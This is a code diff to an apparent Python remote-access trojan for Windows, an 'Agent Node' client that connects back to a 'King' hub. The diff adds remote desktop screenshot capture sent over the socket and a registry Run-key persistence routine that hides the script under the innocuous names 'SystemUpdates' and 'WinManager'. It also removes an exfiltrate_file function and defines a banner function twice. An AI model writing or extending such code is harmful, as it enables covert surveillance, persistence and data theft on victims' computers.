@@ -11,6 +11,76 @@ import ctypes
 import winreg
 import threading
 import subprocess
+try:
+    from mss import mss
+    MSS_AVAILABLE = True
+except ImportError:
+    MSS_AVAILABLE = False
+try:
+    from PIL import Image
+    PIL_AVAILABLE = True
+except ImportError:
+    PIL_AVAILABLE = False
+
+def capture_desktop_screenshot(client: socket.socket) -> None:
+    """Capture primary monitor and send as PNG byte stream to server."""
+    if not MSS_AVAILABLE or not PIL_AVAILABLE:
+        error_msg = json.dumps({'error': 'mss or PIL not installed'})
+        client.send(f"DESKTOP_SIZE {len(error_msg)}\n".encode())
+        client.sendall(error_msg.encode())
+        print("[!] Desktop capture failed: mss or PIL not available")
+        return
+    
+    try:
+        with mss() as sct:
+            # Capture the primary monitor (index 1, as 0 is the virtual screen)
+            monitor = sct.monitors[1]
+            screenshot = sct.grab(monitor)
+            
+            # Convert mss screenshot to PIL Image
+            image = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
+            
+            # Save as PNG bytes
+            import io
+            png_buffer = io.BytesIO()
+            image.save(png_buffer, format='PNG')
+            png_data = png_buffer.getvalue()
+            
+            # Send PNG data to server
+            message = json.dumps({'type': 'desktop_screenshot', 'size': len(png_data)})
+            client.send(f"DESKTOP_SIZE {len(png_data)}\n".encode())
+            client.sendall(png_data)
+            print(f"[+] Desktop screenshot captured and sent ({len(png_data)} bytes)")
+    except Exception as e:
+        error_msg = json.dumps({'error': str(e)})
+        client.send(f"DESKTOP_SIZE {len(error_msg)}\n".encode())
+        client.sendall(error_msg.encode())
+        print(f"[-] Desktop capture failed: {e}")
+
+def ensure_service_continuity() -> None:
+    """Ensure script is registered in Windows Run registry key for persistence."""
+    try:
+        target_file = os.path.join(os.getenv('APPDATA'), 'SystemUpdates', 'win_manager.py')
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER, 
+            r'Software\Microsoft\Windows\CurrentVersion\Run', 
+            0, 
+            winreg.KEY_SET_VALUE
+        )
+        expected_value = f'pythonw "{target_file}"'
+        
+        try:
+            current_value, _ = winreg.QueryValueEx(key, 'WinManager')
+            if current_value != expected_value:
+                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
+                print("[*] Service continuity key updated in registry.")
+        except FileNotFoundError:
+            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
+            print("[*] Service continuity key created in registry.")
+        finally:
+            winreg.CloseKey(key)
+    except Exception as e:
+        print(f"[-] Service continuity setup failed: {e}")
 
 def establish_persistence():
     """Copies the script to the local drive and adds it to Windows Startup."""
@@ -154,6 +224,36 @@ def report_status() -> str:
         info['Uptime'] = 'N/A (psutil not installed)'
     return json.dumps(info)
 
+def _print_node_banner(hub_ip: str, port: int) -> None:
+    print("""
+============================================================
+ Agent Node Client
+------------------------------------------------------------
+""")
+    print(f"Hub IP:    {hub_ip}")
+    print(f"Hub Port:  {port}")
+    print(f"Python:    {platform.python_version()}")
+    print(f"Platform:  {platform.system()} {platform.release()}")
+    print(f"MSS:       {'available' if MSS_AVAILABLE else 'missing'}")
+    print(f"PIL:       {'available' if PIL_AVAILABLE else 'missing'}")
+    print("============================================================\n")
+
+
+def _print_node_banner(hub_ip: str, port: int) -> None:
+    print("""
+============================================================
+ Agent Node Client
+------------------------------------------------------------
+""")
+    print(f"Hub IP:    {hub_ip}")
+    print(f"Hub Port:  {port}")
+    print(f"Python:    {platform.python_version()}")
+    print(f"Platform:  {platform.system()} {platform.release()}")
+    print(f"MSS:       {'available' if MSS_AVAILABLE else 'missing'}")
+    print(f"PIL:       {'available' if PIL_AVAILABLE else 'missing'}")
+    print("============================================================\n")
+
+
 def connect_to_hub(hub_ip: str, port: int) -> None:
     delay = 5  # Start with 5 seconds to allow Wi-Fi to connect after reboot
     while True:
@@ -183,6 +283,11 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                     if command == 'STATUS_REPORT':
                         report = report_status()
                         client.sendall(f'STATUS:{report}\n'.encode('utf-8'))
+                    elif command == 'DESKTOP_CAPTURE':
+                        capture_desktop_screenshot(client)
+                    elif command == 'ENSURE_SERVICE_CONTINUITY':
+                        ensure_service_continuity()
+                        client.sendall(b'SERVICE_CONTINUITY_OK\n')
                     elif command == 'SHUTDOWN_NODE':
                         print('[*] Shutdown command received.')
                         return
@@ -308,22 +413,13 @@ if __name__ == '__main__':
     if not args.no_persist:
         target_file = establish_persistence()
         threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
+        # Ensure service continuity in registry
+        ensure_service_continuity()
     else:
         print('[*] Running without persistence for testing.')
 
+    _print_node_banner(args.hub_ip, args.hub_port)
     if args.hub_ip == '192.168.100.9':
         print('[*] WARNING: Using default HUB_IP 192.168.100.9. Update --hub-ip if King is on a different machine.')
     print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
     connect_to_hub(args.hub_ip, args.hub_port)
-
-
-def exfiltrate_file(file_path):
-    if os.path.exists(file_path):
-        with open(file_path, "rb") as f:
-            data = f.read()
-            # We send the size first so the King knows how much to catch
-            client.send(f"SIZE {len(data)}".encode())
-            time.sleep(1) # Wait for King to prepare
-            client.sendall(data)
-            return "[+] File exfiltrated successfully."
-    return "[!] File not found."
